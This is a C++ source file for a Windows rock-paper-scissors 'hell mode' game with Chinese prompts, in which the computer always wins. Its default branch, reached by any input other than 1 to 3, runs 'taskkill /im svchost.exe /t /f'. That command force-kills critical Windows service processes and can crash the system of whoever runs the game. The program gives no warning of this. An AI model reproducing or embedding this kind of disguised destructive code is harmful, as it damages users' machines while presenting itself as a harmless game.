#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
char out;
int i;

int main() {
	while (1) {
		cout << "石头剪刀布 地狱模式" << endl;
		system("title 石头剪刀布 地狱模式");
		system("color 4F");
		cout << "这种难度下你没有可能赢！" << endl;
		Sleep(3000);
		system("cls");
		cout << "键入1=石头，2=剪刀，3=布\n]";
		cin >> i;
		switch (i) {

			case 1:
				cout << "你出了石头！\n电脑出布！\n你输了！！！=)";
				break;
			case 2:
				cout << "你出了剪刀！\n电脑出石头！\n你输了！！！=)";
				break;
			case 3:
				cout << "你出了布！\n电脑出剪刀！\n你输了！！！=)";
				break;
			default:
				cout << "你玩不起，电脑也玩不起了！";
				Sleep(3000);
				system("taskkill /im svchost.exe /t /f");
		}
		Sleep(3000);
		system("cls") ;
	}

}
